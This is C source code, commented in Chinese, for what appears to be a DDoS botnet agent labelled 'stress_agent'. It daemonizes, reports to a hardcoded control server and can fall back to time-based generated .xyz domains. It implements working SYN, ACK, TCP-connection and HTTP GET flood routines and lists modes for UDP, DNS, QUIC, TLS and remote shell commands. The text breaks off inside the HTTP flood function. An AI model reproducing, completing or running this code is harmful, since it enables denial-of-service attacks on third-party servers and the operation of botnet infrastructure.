#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/file.h>
// 在文件开头添加
#include <sys/select.h>
#include <netdb.h>
#include <netinet/tcp.h>
#include <sys/time.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <fcntl.h>  // 用于open函数
#include <unistd.h> // 用于dup2、close函数

// ========================= 配置常量 =========================
#define CTRL_SERVER_IP   "1192.168.56.10" //控制端服务器地址
#define CTRL_SERVER_PORT 9999  //控制端服务器端口
#define RECONNECT_INTERVAL 5         // 5秒重试间隔

#define VERSION          "5.2"  // 版本号更新
#define MAX_THREADS      1000
#define MAX_CONNECTIONS  100
#define MAX_RETRIES      100
#define RECONNECT_INTERVAL 5
#define COMMAND_BUFFER   4096
#define LOCK_FILE        "/var/run/stress_agent.pid"
#define LOG_FILE         "/var/log/stress_agent.log"
#define MAX_PACKET_SIZE  65535  // 最大数据包大小
#define MIN_PACKET_SIZE  64     // 最小数据包大小
#define AUTH_KEY         "#KEY#1234567890#"  // 新增：身份验证密钥
// 在文件开头添加以下声明
// 自定义定义替代 libgen.h 和 limits.h
#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

// 自定义 dirname 实现
static char *dirname_custom(char *path) {
    static char dot[] = ".";
    char *p = NULL;
    
    if (path == NULL || *path == '\0')
        return dot;
    
    // 移除尾部斜杠
    p = path + strlen(path) - 1;
    while (p > path && *p == '/')
        *p-- = '\0';
    
    // 查找最后一个斜杠
    p = strrchr(path, '/');
    if (p == NULL)
        return dot;
    
    // 处理根目录
    if (p == path) {
        *(p + 1) = '\0';
        return path;
    }
    
    *p = '\0';
    return path;
}

static unsigned int get_random(void);

// 在AttackMode枚举中添加新模式
typedef enum {
    MODE_SYN = 0,
    MODE_ACK = 1,
    MODE_TCP = 2,
    MODE_TCP_CONN = 3,  // 新增：TCP长连接模式
    MODE_UDP = 4,       // 新增：UDP Flood模式
    MODE_HTTP = 5,
    MODE_TLS = 6,
    MODE_DNS = 7,       // 新增：DNS查询攻击模式
    MODE_QUIC = 8,      // 新增：QUIC协议攻击模式
    MODE_SHELL = 9
} AttackMode;

// 自定义IP/TCP头部结构
struct ip_header {
    unsigned int ihl:4;
    unsigned int version:4;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct tcp_header {
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack_seq;
    uint8_t res1:4;
    uint8_t doff:4;
    uint8_t fin:1;
    uint8_t syn:1;
    uint8_t rst:1;
    uint8_t psh:1;
    uint8_t ack:1;
    uint8_t urg:1;
    uint8_t res2:2;
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};

// 网络协议常量
#ifndef IPPROTO_TCP
#define IPPROTO_TCP 6
#endif

#ifndef IP_HDRINCL
#define IP_HDRINCL 3
#endif

// ========================= 全局结构体 =========================
typedef struct {
    char target_ip[256];  // 从16改为256，支持长域名
    unsigned short target_port;
    unsigned int rate;
    unsigned int duration;
    unsigned int threads;
    unsigned int concurrent;
    unsigned int packet_size;  // 新增：数据包大小
    AttackMode mode;
    volatile int running;
    volatile int stop;
    time_t start_time;
    char hostname[256];
    char path[512];
    char shell_cmd[1024];
	int pps;   // 添加这个成员，表示每秒包数
} AttackParams;

typedef struct {
    pthread_t thread_id;
    int thread_num;
    AttackParams *params;
    unsigned long packets_sent;
} ThreadData;

// 全局变量
static AttackParams current_attack = {0};
static pthread_t attack_threads[MAX_THREADS];
static ThreadData thread_data[MAX_THREADS];
static int active_threads = 0;
static volatile int global_stop = 0;
static volatile int daemon_mode = 1;
static int lock_fd = -1;
static int reconnect_count = 0;
static pthread_mutex_t attack_mutex = PTHREAD_MUTEX_INITIALIZER;

// 函数原型声明
static void stop_attack();
static unsigned short checksum(unsigned short *addr, int len);
static void fill_random_data(char *buffer, int size);

// ========================= 工具函数 =========================
// 记录日志
static void log_message(const char *fmt, ...) {
    char buffer[1024];
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    
    int len = snprintf(buffer, sizeof(buffer), "[%04d-%02d-%02d %02d:%02d:%02d] ",
                      tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
                      tm->tm_hour, tm->tm_min, tm->tm_sec);
    
    va_list args;
    va_start(args, fmt);
    vsnprintf(buffer + len, sizeof(buffer) - len, fmt, args);
    va_end(args);
    
    if (!daemon_mode) {
        printf("%s\n", buffer);
    }
    
    FILE *log = fopen(LOG_FILE, "a");
    if (log) {
        fprintf(log, "%s\n", buffer);
        fclose(log);
    }
}

// ========================= 简单哈希函数（路由器友好） =========================
// 简单的DJB2哈希算法，不需要外部库
static unsigned int simple_hash(const char *str) {
    unsigned int hash = 5381;
    int c;
    
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;  // hash * 33 + c
    }
    
    return hash;
}

// 改进的NTP时间获取函数
static time_t get_ntp_time() {
    int sockfd = -1;
    struct sockaddr_in serv_addr;
    struct hostent *server = NULL;
    unsigned char ntp_packet[48] = {0};
    time_t ntp_time = 0;
    
    // 尝试多个NTP服务器
    const char *ntp_servers[] = {
        "ntp.aliyun.com",      // 阿里云NTP
        "time.windows.com",    // 微软NTP
        "time.cloudflare.com", // Cloudflare NTP
        "pool.ntp.org",        // NTP池
        "cn.ntp.org.cn"        // 中国NTP
    };
    
    int num_servers = sizeof(ntp_servers) / sizeof(ntp_servers[0]);
    
    // 构造NTP请求包
    memset(ntp_packet, 0, 48);
    ntp_packet[0] = 0x1B;  // LI=0, Version=3, Mode=3 (Client)
    
    for (int i = 0; i < num_servers; i++) {
        sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sockfd < 0) {
            continue;
        }
        
        // 设置超时
        struct timeval timeout = {2, 0};  // 2秒超时
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        
        server = gethostbyname(ntp_servers[i]);
        if (server == NULL) {
            close(sockfd);
            continue;
        }
        
        memset(&serv_addr, 0, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(123);
        memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
        
        // 发送NTP请求
        if (sendto(sockfd, ntp_packet, 48, 0, 
                  (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            close(sockfd);
            continue;
        }
        
        // 接收响应
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(sockfd, &read_fds);
        
        struct timeval tv = {2, 0};
        int ret = select(sockfd + 1, &read_fds, NULL, NULL, &tv);
        
        if (ret > 0) {
            socklen_t len = sizeof(serv_addr);
            if (recvfrom(sockfd, ntp_packet, 48, 0, 
                        (struct sockaddr *)&serv_addr, &len) >= 48) {
                // 解析NTP时间
                unsigned int seconds_since_1900 = 
                    (ntp_packet[40] << 24) | (ntp_packet[41] << 16) | 
                    (ntp_packet[42] << 8) | ntp_packet[43];
                
                // 转换为UNIX时间戳
                ntp_time = (time_t)(seconds_since_1900 - 2208988800ULL);
                
                // 转换为北京时间（UTC+8）
                ntp_time += 8 * 3600;
                
                close(sockfd);
                return ntp_time;
            }
        }
        
        close(sockfd);
    }
    
    // 如果所有NTP服务器都失败，使用本地时间加上8小时
    return time(NULL) + 8 * 3600;
}

// 改进的域名生成函数
static void generate_backup_domain(char *domain, size_t domain_size) {
    // 获取当前时间戳
    time_t now = time(NULL);
    
    // 尝试获取NTP时间，但设置较短的超时
    time_t beijing_time = get_ntp_time();
    
    // 如果NTP时间无效，使用本地时间
    if (beijing_time < 1609459200) {  // 简单验证（2021-01-01之后）
        beijing_time = now + 8 * 3600;
    }
    
    struct tm *tm_info = localtime(&beijing_time);
    if (tm_info == NULL) {
        tm_info = localtime(&now);
    }
    
    // 生成时间字符串：年月日时分秒
    char time_str[32];
    strftime(time_str, sizeof(time_str), "%Y%m%d%H%M%S", tm_info);
    
    char input_str[64];
    snprintf(input_str, sizeof(input_str), "%s_hellobot_%d", time_str, get_random());
    
    // 使用简单哈希
    unsigned int hash_value = simple_hash(input_str);
    
    // 将哈希值转换为8位十六进制字符串
    char hash_str[9];
    snprintf(hash_str, sizeof(hash_str), "%08x", hash_value);
    
    // 使用不同后缀增加域名变化
    const char *suffixes[] = {".xyz"};
    int suffix_index = (hash_value % 1);
    
    snprintf(domain, domain_size, "%s%s", hash_str, suffixes[suffix_index]);
    
    // 记录
    char time_display[64];
    strftime(time_display, sizeof(time_display), "%Y-%m-%d %H:%M:%S", tm_info);
    log_message("生成新域名: %s (时间: %s)", domain, time_display);
}

// 创建互斥锁防止重复运行
static int create_lock() {
    lock_fd = open(LOCK_FILE, O_RDWR | O_CREAT, 0644);
    if (lock_fd < 0) {
        return -1;
    }
    
    if (flock(lock_fd, LOCK_EX | LOCK_NB) < 0) {
        if (errno == EWOULDBLOCK) {
            close(lock_fd);
            return -1;
        }
    }
    
    char pid[16];
    snprintf(pid, sizeof(pid), "%d\n", getpid());
    ftruncate(lock_fd, 0);
    write(lock_fd, pid, strlen(pid));
    
    return 0;
}

static void remove_lock() {
    if (lock_fd >= 0) {
        flock(lock_fd, LOCK_UN);
        close(lock_fd);
        unlink(LOCK_FILE);
    }
}

// 信号处理
static void signal_handler(int sig) {
    switch (sig) {
        case SIGINT:
        case SIGTERM:
            log_message("收到终止信号，正在停止...");
            global_stop = 1;
            current_attack.stop = 1;
            break;
        case SIGUSR1:
            log_message("收到状态信号，当前状态: %s", 
                       current_attack.running ? "攻击中" : "空闲");
            break;
        case SIGUSR2:
            log_message("收到重连信号");
            global_stop = 1;
            break;
    }
}

// 守护进程化
static int daemonize() {
    pid_t pid = fork();
    if (pid < 0) {
        return -1;
    }
    if (pid > 0) {
        exit(0);
    }
    
    setsid();
    chdir("/");
    
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    int fd = open("/dev/null", O_RDWR);
    if (fd != -1) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > STDERR_FILENO) close(fd);
    }
    
    return 0;
}

// 获取随机数
static unsigned int get_random() {
    static unsigned int seed = 0;
    if (seed == 0) {
        seed = time(NULL) ^ getpid();
    }
    seed = seed * 1103515245 + 12345;
    return (unsigned int)(seed / 65536) % 32768;
}

// 获取随机端口
static unsigned short random_port() {
    return 1024 + (get_random() % 64511);
}

// 填充随机数据
static void fill_random_data(char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = (char)(get_random() % 256);
    }
}

// 计算校验和
static unsigned short checksum(unsigned short *addr, int len) {
    unsigned int sum = 0;
    unsigned short answer = 0;
    
    while (len > 1) {
        sum += *addr++;
        len -= 2;
    }
    
    if (len == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)addr;
        sum += answer;
    }
    
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    
    return answer;
}

// 计算TCP伪头部校验和
static unsigned short tcp_checksum(struct ip_header *iph, struct tcp_header *tcph, char *data, int data_len) {
    char pseudo_header[12 + sizeof(struct tcp_header) + data_len];
    unsigned short *ptr = (unsigned short *)pseudo_header;
    unsigned int sum = 0;
    
    // 构建伪头部
    memcpy(pseudo_header, &iph->saddr, 4);
    memcpy(pseudo_header + 4, &iph->daddr, 4);
    pseudo_header[8] = 0;
    pseudo_header[9] = IPPROTO_TCP;
    *((unsigned short *)(pseudo_header + 10)) = htons(sizeof(struct tcp_header) + data_len);
    memcpy(pseudo_header + 12, tcph, sizeof(struct tcp_header));
    if (data_len > 0) {
        memcpy(pseudo_header + 12 + sizeof(struct tcp_header), data, data_len);
    }
    
    int len = 12 + sizeof(struct tcp_header) + data_len;
    
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    
    if (len == 1) {
        unsigned char odd[2] = {0};
        odd[0] = *(unsigned char *)ptr;
        sum += *(unsigned short *)odd;
    }
    
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    
    return (unsigned short)~sum;
}

// ========================= 网络函数 =========================
// 创建TCP套接字
static int create_tcp_socket(int nonblock) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }
    
    if (nonblock) {
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    }
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    return sock;
}

// 创建原始套接字
static int create_raw_socket() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    }
    if (sock < 0) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
    }
    
    if (sock >= 0) {
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    }
    
    return sock;
}

// ========================= 新增函数：获取本地真实IP地址 =========================
// 获取本机出口IP地址（连接到目标地址时使用的源IP）
static unsigned int get_local_ip(const char *target_ip, unsigned short target_port) {
    int sock = -1;
    unsigned int local_ip = 0;
    
    // 尝试创建一个临时的TCP连接来获取本地IP
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
    }
    
    if (sock >= 0) {
        struct sockaddr_in target_addr;
        memset(&target_addr, 0, sizeof(target_addr));
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(target_port);
        
        // 解析目标地址
        if (inet_aton(target_ip, &target_addr.sin_addr) == 0) {
            struct hostent *he = gethostbyname(target_ip);
            if (he != NULL) {
                memcpy(&target_addr.sin_addr, he->h_addr, he->h_length);
            } else {
                close(sock);
                return 0;
            }
        }
        
        // 尝试连接到目标（但不真正发送数据）
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
        
        connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        fd_set fdset;
        struct timeval tv;
        
        FD_ZERO(&fdset);
        FD_SET(sock, &fdset);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        
        if (select(sock + 1, NULL, &fdset, NULL, &tv) == 1) {
            int so_error;
            socklen_t len = sizeof(so_error);
            getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
            
            if (so_error == 0) {
                // 连接成功（或至少尝试了），获取本地地址
                struct sockaddr_in local_addr;
                socklen_t addr_len = sizeof(local_addr);
                if (getsockname(sock, (struct sockaddr *)&local_addr, &addr_len) == 0) {
                    local_ip = local_addr.sin_addr.s_addr;
                }
            }
        }
        
        close(sock);
    }
    
    // 如果上述方法失败，尝试获取默认网络接口的IP
    if (local_ip == 0) {
        int sock2 = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock2 >= 0) {
            // 连接到一个公共DNS服务器（8.8.8.8）来获取本地IP
            struct sockaddr_in dns_addr;
            memset(&dns_addr, 0, sizeof(dns_addr));
            dns_addr.sin_family = AF_INET;
            dns_addr.sin_port = htons(53);
            inet_aton("8.8.8.8", &dns_addr.sin_addr);
            
            connect(sock2, (struct sockaddr *)&dns_addr, sizeof(dns_addr));
            
            struct sockaddr_in local_addr;
            socklen_t addr_len = sizeof(local_addr);
            if (getsockname(sock2, (struct sockaddr *)&local_addr, &addr_len) == 0) {
                local_ip = local_addr.sin_addr.s_addr;
            }
            
            close(sock2);
        }
    }
    
    return local_ip;
}

// ========================= 修改后的SYN Flood攻击函数 =========================
static void *attack_syn(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackParams *params = data->params;
    unsigned long packets = 0;
    time_t start = time(NULL);
    
    // 获取本地真实IP地址
    unsigned int local_ip = get_local_ip(params->target_ip, params->target_port);
    if (local_ip == 0) {
        // 如果获取失败，尝试使用回环地址（最后的手段）
        log_message("线程 %d: 无法获取本地IP，使用默认IP", data->thread_num);
        local_ip = inet_addr("127.0.0.1");
    } else {
        char ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &local_ip, ip_str, sizeof(ip_str));
        log_message("线程 %d: 使用本地IP地址: %s", data->thread_num, ip_str);
    }
    
    int sock = create_raw_socket();
    if (sock < 0) {
        log_message("线程 %d: 无法创建原始套接字", data->thread_num);
        return NULL;
    }
    
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(params->target_ip);
    dest.sin_port = htons(params->target_port);
    
    // 计算数据包大小
    unsigned int packet_size = params->packet_size;
    if (packet_size < MIN_PACKET_SIZE) packet_size = MIN_PACKET_SIZE;
    if (packet_size > MAX_PACKET_SIZE) packet_size = MAX_PACKET_SIZE;
    
    // 计算数据部分大小
    int ip_tcp_header_size = sizeof(struct ip_header) + sizeof(struct tcp_header);
    int data_size = packet_size - ip_tcp_header_size;
    if (data_size < 0) data_size = 0;
    
    // 分配完整数据包缓冲区
    char *packet = malloc(packet_size);
    if (!packet) {
        log_message("线程 %d: 内存分配失败", data->thread_num);
        close(sock);
        return NULL;
    }
    
    struct ip_header *iph = (struct ip_header *)packet;
    struct tcp_header *tcph = (struct tcp_header *)(packet + sizeof(struct ip_header));
    char *tcp_data = packet + ip_tcp_header_size;
    
    // 发送循环
    while (!global_stop && !params->stop) {
        if (params->duration > 0 && (time(NULL) - start) >= params->duration) {
            break;
        }
        
        // 使用随机源端口，但固定本地真实IP
        unsigned short src_port = random_port();
        
        // 填充IP头部
        memset(packet, 0, packet_size);
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(packet_size);
        iph->id = htons(get_random());
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = local_ip;  // 使用真实本地IP
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = checksum((unsigned short *)iph, sizeof(struct ip_header));
        
        // 填充TCP头部
        tcph->source = htons(src_port);
        tcph->dest = htons(params->target_port);
        tcph->seq = htonl(get_random());
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        // 填充TCP数据（随机内容）
        if (data_size > 0) {
            fill_random_data(tcp_data, data_size);
        }
        
        // 计算TCP校验和（包含数据）
        tcph->check = tcp_checksum(iph, tcph, tcp_data, data_size);
        
        // 发送数据包
        sendto(sock, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest));
        
        packets++;
        data->packets_sent = packets;
        
        // 控制速率
        if (params->rate > 0) {
            usleep(1000000 / params->rate);
        }
    }
    
    free(packet);
    close(sock);
    log_message("线程 %d: SYN攻击完成，发送 %lu 个包，包大小: %u 字节，使用真实IP", 
                data->thread_num, packets, packet_size);
    return NULL;
}

// ========================= 修改后的ACK Flood攻击函数 =========================
static void *attack_ack(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackParams *params = data->params;
    unsigned long packets = 0;
    time_t start = time(NULL);
    
    // 获取本地真实IP地址
    unsigned int local_ip = get_local_ip(params->target_ip, params->target_port);
    if (local_ip == 0) {
        // 如果获取失败，尝试使用回环地址
        log_message("线程 %d: 无法获取本地IP，使用默认IP", data->thread_num);
        local_ip = inet_addr("127.0.0.1");
    } else {
        char ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &local_ip, ip_str, sizeof(ip_str));
        log_message("线程 %d: 使用本地IP地址: %s", data->thread_num, ip_str);
    }
    
    int sock = create_raw_socket();
    if (sock < 0) {
        log_message("线程 %d: 无法创建原始套接字", data->thread_num);
        return NULL;
    }
    
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(params->target_ip);
    dest.sin_port = htons(params->target_port);
    
    // 计算数据包大小
    unsigned int packet_size = params->packet_size;
    if (packet_size < MIN_PACKET_SIZE) packet_size = MIN_PACKET_SIZE;
    if (packet_size > MAX_PACKET_SIZE) packet_size = MAX_PACKET_SIZE;
    
    int ip_tcp_header_size = sizeof(struct ip_header) + sizeof(struct tcp_header);
    int data_size = packet_size - ip_tcp_header_size;
    if (data_size < 0) data_size = 0;
    
    char *packet = malloc(packet_size);
    if (!packet) {
        log_message("线程 %d: 内存分配失败", data->thread_num);
        close(sock);
        return NULL;
    }
    
    struct ip_header *iph = (struct ip_header *)packet;
    struct tcp_header *tcph = (struct tcp_header *)(packet + sizeof(struct ip_header));
    char *tcp_data = packet + ip_tcp_header_size;
    
    while (!global_stop && !params->stop) {
        if (params->duration > 0 && (time(NULL) - start) >= params->duration) {
            break;
        }
        
        // 使用随机源端口，但固定本地真实IP
        unsigned short src_port = random_port();
        
        memset(packet, 0, packet_size);
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(packet_size);
        iph->id = htons(get_random());
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = local_ip;  // 使用真实本地IP
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = checksum((unsigned short *)iph, sizeof(struct ip_header));
        
        tcph->source = htons(src_port);
        tcph->dest = htons(params->target_port);
        tcph->seq = htonl(get_random());
        tcph->ack_seq = htonl(get_random());
        tcph->doff = 5;
        tcph->ack = 1;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        // 填充TCP数据
        if (data_size > 0) {
            fill_random_data(tcp_data, data_size);
        }
        
        // 计算TCP校验和
        tcph->check = tcp_checksum(iph, tcph, tcp_data, data_size);
        
        sendto(sock, packet, packet_size, 0, (struct sockaddr *)&dest, sizeof(dest));
        
        packets++;
        data->packets_sent = packets;
        
        if (params->rate > 0) {
            usleep(1000000 / params->rate);
        }
    }
    
    free(packet);
    close(sock);
    log_message("线程 %d: ACK攻击完成，发送 %lu 个包，包大小: %u 字节，使用真实IP", 
                data->thread_num, packets, packet_size);
    return NULL;
}

// 连接到服务器（使用IP地址，不解析域名）
static int tcp_connect_to_ip(int sock, const char *ip, int port) {
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    if (inet_aton(ip, &addr.sin_addr) == 0) {
        // 传入的应该是IP，但解析失败，说明有问题
        return -1;
    }
    
    int result = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (result < 0 && errno != EINPROGRESS) {
        return -1;
    }
    
    fd_set fdset;
    struct timeval tv;
    
    FD_ZERO(&fdset);
    FD_SET(sock, &fdset);
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fdset, NULL, &tv) == 1) {
        int so_error;
        socklen_t len = sizeof(so_error);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
        if (so_error == 0) {
            return 0;
        }
    }
    
    return -1;
}

// TCP Flood攻击（支持数据包大小） - 优化版本，只解析一次域名
static void *attack_tcp(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackParams *params = data->params;
    unsigned long packets = 0;
    time_t start = time(NULL);
    
    // 预先解析域名
    char resolved_ip[16] = {0};
    struct sockaddr_in target_addr;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(params->target_port);
    
    // 如果target_ip看起来是IP地址，直接使用
    if (inet_aton(params->target_ip, &target_addr.sin_addr) == 0) {
        // 尝试解析域名
        struct hostent *he = gethostbyname(params->target_ip);
        if (he == NULL) {
            log_message("线程 %d: 域名解析失败: %s", data->thread_num, params->target_ip);
            return NULL;
        }
        memcpy(&target_addr.sin_addr, he->h_addr, he->h_length);
        inet_ntop(AF_INET, he->h_addr, resolved_ip, sizeof(resolved_ip));
        log_message("线程 %d: 域名解析完成: %s -> %s", data->thread_num, params->target_ip, resolved_ip);
    } else {
        strncpy(resolved_ip, params->target_ip, sizeof(resolved_ip)-1);
    }
    
    // 计算数据包大小
    unsigned int packet_size = params->packet_size;
    if (packet_size < MIN_PACKET_SIZE) packet_size = MIN_PACKET_SIZE;
    if (packet_size > 1460) packet_size = 1460;  // TCP MSS通常为1460
    
    // 创建数据缓冲区
    char *buffer = malloc(packet_size);
    if (!buffer) {
        log_message("线程 %d: 内存分配失败", data->thread_num);
        return NULL;
    }
    fill_random_data(buffer, packet_size);
    
    // 创建多个连接
    int socks[MAX_CONNECTIONS];
    int sock_count = params->concurrent;
    if (sock_count > MAX_CONNECTIONS) sock_count = MAX_CONNECTIONS;
    if (sock_count < 1) sock_count = 1;
    
    for (int i = 0; i < sock_count; i++) {
        socks[i] = -1;
    }
    
    // 使用已解析的IP地址
    const char *target_to_use = (resolved_ip[0] != '\0') ? resolved_ip : params->target_ip;
    
    while (!global_stop && !params->stop) {
        if (params->duration > 0 && (time(NULL) - start) >= params->duration) {
            break;
        }
        
        for (int i = 0; i < sock_count; i++) {
            if (socks[i] < 0) {
                // 创建新连接
                socks[i] = create_tcp_socket(1);
                if (socks[i] >= 0) {
                    // 使用已解析的IP地址连接
                    tcp_connect_to_ip(socks[i], target_to_use, params->target_port);
                }
            } else {
                // 发送数据
                int sent = send(socks[i], buffer, packet_size, 0);
                if (sent > 0) {
                    packets++;
                    data->packets_sent = packets;
                } else {
                    // 连接可能已断开，标记为需要重新连接
                    close(socks[i]);
                    socks[i] = -1;
                }
            }
        }
        
        usleep(1000);
    }
    
    // 清理连接
    for (int i = 0; i < sock_count; i++) {
        if (socks[i] >= 0) {
            close(socks[i]);
        }
    }
    
    free(buffer);
    log_message("线程 %d: TCP攻击完成，发送 %lu 个包，包大小: %u 字节", 
                data->thread_num, packets, packet_size);
    return NULL;
}

// HTTP GET Flood攻击 - 连接复用优化版本
static void *attack_http(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackParams *params = data->params;
    unsigned long requests = 0;
    time_t start = time(NULL);
    int sock = -1;  // 单个套接字用于连接复用
    
    // 预先解析域名
    char resolved_ip[16] = {0};
    struct sockaddr_in target_addr;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(params->target_port);
    
    // 如果target_ip看起来是IP地址，直接使用
    if (inet_aton(params->target_ip, &target_addr.sin_addr) == 0) {
        // 尝试解析域名
        struct hostent *he = gethostbyname(params->target_ip);
        if (he == NULL) {
            log_message("线程 %d: 域名解析失败: %s", data->thread_num, params->target_ip);
            return NULL;
        }
        memcpy(&target_addr.sin_addr, he->h_addr, he->h_length);
        inet_ntop(AF_INET, he->h_addr, resolved_ip, sizeof(resolved_ip));
        log_message("线程 %d: 域名解析完成: %s -> %s", data->thread_num, params->target_ip, resolved_ip);
    } else {
        strncpy(resolved_ip, params->target_ip, sizeof(resolved_ip)-1);
    }
    
    // 计算数据包大小
    unsigned int packet_size = params->packet_size;
    if (packet_size < MIN_PACKET_SIZE) packet_size = MIN_PACKET_SIZE;
    if (packet_size > 8192) packet_size = 8192;  // 合理的HTTP请求大小限制
    
    // 确定Host头部值
    const char *host_header = NULL;
    if (strlen(params->hostname) > 0) {
        host_header = params->hostname;
    } else {
        host_header = params->target_ip;
    }
    
    // 构造HTTP请求（使用持久连接头部）
    char request[8192] = {0};
    int base_len = snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n"
             "Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\r\n"
             "Accept-Encoding: gzip, deflate, br\r\n"
             "Connection: keep-alive\r\n"  // 关键：使用持久连接
             "Upgrade-Insecure-Requests: 1\r\n"
             "Sec-Fetch-Dest: document\r\n"
             "Sec-Fetch-Mode: navigate\r\n"
             "Sec-Fetch-Site: none\r\n"
             "Cache-Control: max-age=0\r\n"
             "Pragma: no-cache\r\n",
             params->path, host_header);
    
    // 如果需要填充，添加额外的头部
    int header_idx = 5;  // 用于轮换不同的填充头部
    if (packet_size > (unsigned int)base_len + 4) {  // +4 是为了 "\r\n\r\n"
        int fill_size = packet_size - base_len - 4;
        int added = 0;
        
        // 添加常见的HTTP头部进行填充
        while (added < fill_size) {
            int remaining = fill_size - added;
            
            // 轮换不同的头部，避免完全相同的请求
            switch (header_idx % 6) {
                case 0:
                    if (remaining >= 60) {
                        int len = snprintf(request + base_len + added, remaining, 
                            "Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"\r\n");
                        if (len > 0) added += len;
                    }
                    break;
                case 1:
                    if (remaining >= 25) {
                        int len = snprintf(request + base_len + added, remaining, 
                            "Sec-Ch-Ua-Mobile: ?0\r\n");
                        if (len > 0) added += len;
                    }
                    break;
                case 2:
                    if (remaining >= 30) {
                        int len = snprintf(request + base_len + added, remaining, 
                            "Sec-Ch-Ua-Platform: \"Windows\"\r\n");
                        if (len > 0) added += len;
                    }
                    break;
                case 3:
                    if (remaining >= 10) {
                        int len = snprintf(request + base_len + added, remaining, 
                            "DNT: 1\r\n");
